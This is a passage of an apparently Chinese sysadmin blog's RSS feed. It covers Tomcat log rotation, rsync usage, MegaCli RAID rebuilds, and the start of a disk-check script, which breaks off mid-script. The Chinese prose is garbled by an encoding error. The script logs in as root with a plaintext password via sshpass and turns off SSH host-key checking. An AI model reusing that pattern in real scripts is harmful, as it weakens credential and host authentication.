&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;/export/servers/tomcat/tomcat/logs/catalina.out{
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    copytruncate
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    daily
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    rotate 7
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    missingok
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;    compress
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä»¥ä¸Šçš„é…ç½®è¯´æ˜ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/export/servers/tomcat/tomcat/logs/catalina.out{ # è¦è½®è½¬çš„æ–‡ä»¶
copytruncate  # åˆ›å»ºæ–°çš„catalina.outå‰¯æœ¬åï¼Œtruncateæºcatalina.outæ–‡ä»¶ï¼Œä¼šä¸¢æ•°æ®!!!
daily     # æ¯å¤©è¿›è¡Œcatalina.outæ–‡ä»¶çš„è½®è½¬
rotate 7   # è‡³å¤šä¿ç•™7ä¸ªå‰¯æœ¬
missingok   # å¦‚æœè¦è½®è½¬çš„æ–‡ä»¶ä¸¢å¤±äº†ï¼Œç»§ç»­è½®è½¬è€Œä¸æŠ¥é”™
compress   # ä½¿ç”¨å‹ç¼©çš„æ–¹å¼ï¼ˆéå¸¸æœ‰ç”¨ï¼ŒèŠ‚çœç¡¬ç›˜ç©ºé—´ï¼›ä¸€ä¸ª2~3GBçš„æ—¥å¿—æ–‡ä»¶å¯ä»¥å‹ç¼©æˆ60MBå·¦å³ï¼‰
}&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å¯ä»¥æ‰‹å·¥å¼ºåˆ¶æ‰§è¡Œlogrotateç¨‹åºã€‚åœ¨å‘½ä»¤è¡Œè¿è¡Œï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Rsyncçš„æ—¥å¸¸ä½¿ç”¨æ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20231228-rsync/</link>
      <pubDate>Thu, 28 Dec 2023 08:40:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231228-rsync/</guid>
      <description>&lt;h4 id=&#34;rsyncçš„åŸºæœ¬å‚æ•°&#34;&gt;Rsyncçš„åŸºæœ¬å‚æ•°&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-a : å½’æ¡£æ¨¡å¼ï¼Œé€’å½’æ‹·è´ï¼Œå¸¦å±æ€§ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-u : åŒæ­¥æ—¶ç›®æ ‡ç›®å½•ä¸­å¦‚æœæŸæ–‡ä»¶æ¯”æºä¸­æ–‡ä»¶æ—¶é—´è¦æ–°ï¼Œåˆ™ä¿ç•™ä¸åŠ¨ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-v : è¯¦ç»†æ˜¾ç¤ºä¿¡æ¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-z : å‹ç¼©
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-h : æ˜¾ç¤ºå‹å¥½ä¿¡æ¯
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-P : æ˜¾ç¤ºä¼ è¾“è¿›åº¦ç™¾åˆ†æ¯”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-R : ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-e : ä½¿ç”¨sshæ¥ä¼ è¾“
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  æºå¦‚æœæ²¡æœ‰/ï¼Œä»£è¡¨è¿åŒç›®å½•ä»¥åŠç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç»Ÿç»Ÿæ‹·è´åˆ°ç›®çš„å»
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  æºå¦‚æœæœ€åå¸¦/ï¼Œæ„æ€æ˜¯/*ï¼Œä»£è¡¨åªæ‹·è´ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¸åŒ…æ‹¬ç›®å½•æœ¬èº«
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  å¦‚æœå‚æ•°ä¸­å¸¦-Rï¼Œé‚£æ— è®ºæºåé¢æœ‰æ— /ï¼Œéƒ½æŒ‰åŸæœ‰ç›®å½•çŠ¶æ€æ‹·è¿‡å»
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-R ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œä¼šä¿ç•™æºç›®å½•çš„ç›®å½•ç»“æ„ã€‚
å¦‚rsync -av /foo/bar/baz.c remote::/tmp/ï¼Œä¼šå°†baz.cä¼ åˆ°/tmpä¸‹ï¼Œ
è€Œä½¿ç”¨äº†-Rï¼Œåˆ™åœ¨/tmpä¸‹çš„æ–‡ä»¶ç»“æ„å°†ä¼šæ˜¯foo/bar/baz.cã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸‹é¢ä¸¤ç§ç”¨æ³•ä¸€æ ·ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rsync -auvPR --exclude &lt;span class=&#34;s1&#34;&gt;&amp;#39;upload&amp;#39;&lt;/span&gt; new 172.18.34.38::new/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rsync -auvPR --exclude &lt;span class=&#34;s1&#34;&gt;&amp;#39;upload&amp;#39;&lt;/span&gt; ./new 172.18.34.38::new/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;å¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•&#34;&gt;å¤§è§„æ¨¡ä¼ è¾“ç»†å°æ–‡ä»¶çš„æ–¹æ³•ï¼š&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;find ./new -mindepth &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; -maxdepth &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; -type d -print0 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs -P &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; -n &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt; -I % -0 rsync -auvPR % 172.18.34.38::new/
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;-print0 -0 findå‘½ä»¤æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å‚æ•°-print0ï¼ŒæŒ‡å®šè¾“å‡ºçš„æ–‡ä»¶åˆ—è¡¨ä»¥nullåˆ†éš”ã€‚ç„¶åï¼Œxargså‘½ä»¤çš„-0å‚æ•°è¡¨ç¤ºç”¨nullå½“ä½œåˆ†éš”ç¬¦ã€‚
-I -IæŒ‡å®šæ¯ä¸€é¡¹å‘½ä»¤è¡Œå‚æ•°çš„æ›¿ä»£å­—ç¬¦ä¸²ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Megacliç”¨æ¥é‡å»ºä¸çŸ¥é“æ­£ç¡®æ§½ä½çš„Raid</title>
      <link>https://rendoumi.com/posts/20231227-megacli_rebuild/</link>
      <pubDate>Wed, 27 Dec 2023 16:54:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231227-megacli_rebuild/</guid>
      <description>&lt;p&gt;192.168.85.7ä¸Šé¢æœ‰ä¸¤ä¸ªRaid&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªRaid1, 500Gï¼Œåº”è¯¥æ˜¯ä¸¤å—ç›˜ï¼Œç°åœ¨ä¸¢äº†ä¸€å—ï¼Œæ­£ç¡®çš„æ§½ä½ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ª
å¦ä¸€ä¸ªæ˜¯Raid0ï¼Œ4TBï¼Œè¿è¡Œæ­£å¸¸&lt;/p&gt;
&lt;p&gt;ç°åœ¨åœ¨ä¸€ä¸ªæ–°æ§½ä½ä¸Šæ’äº†ä¸€å—ç¡¬ç›˜ï¼Œä½†æ˜¯æ§½ä½ä¸å¯¹ï¼Œæ²¡æœ‰è‡ªåŠ¨rebuildï¼ŒçŠ¶æ€æ˜¯unconfiged good.&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŸ¥ä¸€ä¸‹ä¸¢å¤±çš„ç›˜&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/opt/MegaRAID/MegaCli/MegaCli64 -Pdgetmissing -a0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231227-megacli_rebuild/2021-07-08_112751.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¾—åˆ°&lt;strong&gt;å‚æ•°Array 0ï¼ŒRow 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é¦–å…ˆè¿›è¡Œæ›¿æ¢ï¼Œæ–°ç›˜çš„idæ˜¯32:2ï¼Œæ›¿æ¢æ‰Array0 Row1çš„ç›˜&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/MegaRAID/MegaCli/MegaCli64 -PdReplaceMissing -PhysDrv &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;32:2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -Array0 -row1 -a0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231227-megacli_rebuild/2021-07-08_113110.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå¼ºåˆ¶è¿™å—æ–°ç›˜å¼€å§‹é‡å»º&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -PhysDrv &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;32:2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -a0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231227-megacli_rebuild/2021-07-08_113250.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;éšæ—¶æŸ¥çœ‹ä¸€ä¸‹è¿›åº¦&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -PhysDrv &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;32:2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; -a0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231227-megacli_rebuild/2021-07-08_113429.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä¸Šé¢å·²ç»èµ°äº†5%äº†ï¼Œèµ°å®Œå°±okäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹å®šæœŸæ£€æŸ¥ç‰©ç†æœºç£ç›˜çš„è„šæœ¬</title>
      <link>https://rendoumi.com/posts/20231227-megacli_disk/</link>
      <pubDate>Wed, 27 Dec 2023 16:35:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231227-megacli_disk/</guid>
      <description>&lt;p&gt;é€‚ç”¨äºæ‰€æœ‰MegaCliçš„æœºå™¨ã€‚æ— è®ºdellã€æµªæ½®è¿˜æ˜¯H3Cã€‚&lt;/p&gt;
&lt;p&gt;å¿…é¡»æ¯å¤©ä¸Šåˆã€ä¸‹åˆå„æ£€æŸ¥ä¸€ä¸‹æ‰€æœ‰ç‰©ç†æœºçš„ç£ç›˜å•Šï¼Œæœ‰é—®é¢˜åŠæ—¶å¤„ç†ã€‚&lt;/p&gt;
&lt;p&gt;172.18.31.2  /usr/local/bin/check_disk.sh è„šæœ¬ï¼š&lt;/p&gt;
&lt;p&gt;L1åˆ°L5ï¼Œæ˜¯5ä¸ªæœºæŸœï¼Œä»ä¸Šåˆ°ä¸‹æ˜¯172.18.x.xçš„ipåˆ†å¸ƒ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;L1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;30.1  30.2  30.3  30.4   30.5  30.6  30.7  30.8  30.9  30.10 30.11 30.12  30.13 30.14 30.15 30.16 20.25 30.18&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;L2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;30.19 20.23 20.24 20.30  20.31 20.9  20.10 20.37 20.38 20.39 30.29 30.30  20.16 20.17 30.33 30.34 30.35 30.36&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;L3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;30.37 20.44 20.45 22.200 30.41 30.42 30.43 30.44 30.45 30.46 30.47 22.201 30.49 30.50 20.51 20.52 20.58 20.59&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;L4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;20.65 20.66 30.57 30.58  30.59 30.60 20.1  20.2  30.63 30.64 30.65 30.66  30.67 30.68 30.69 30.70 30.71 30.72&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;L5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;30.73 30.74 30.75 30.76&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; /tmp/idrac.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; /tmp/idracout.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; i in L1 L2 L3 L4 L5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nv&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;@&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; j in &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;!var&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Scan &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 172.18.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$j&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;......&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /tmp/idrac.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@172.18.&lt;span class=&#34;nv&#34;&gt;$j&lt;/span&gt; /opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;S.M.A.R.T&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /tmp/idrac.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;lines&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;grep -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;Yes&amp;#34;&lt;/span&gt;  /tmp/idrac.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -f1 -d:&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${#&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;lines&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[@]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; -eq &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; findline in &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;lines&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[@]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;grep -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;\.\.\.\.\.\.&amp;#34;&lt;/span&gt;  /tmp/idrac.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;cut -f1 -d:&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;newarray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;findline&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;sortarray&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;newarray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[@]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tr &lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;sort -n&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;i&amp;lt;&lt;span class=&#34;si&#34;&gt;${#&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sortarray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;i++&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;sortarray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt; -eq &lt;span class=&#34;nv&#34;&gt;$findline&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;then&lt;/span&gt;
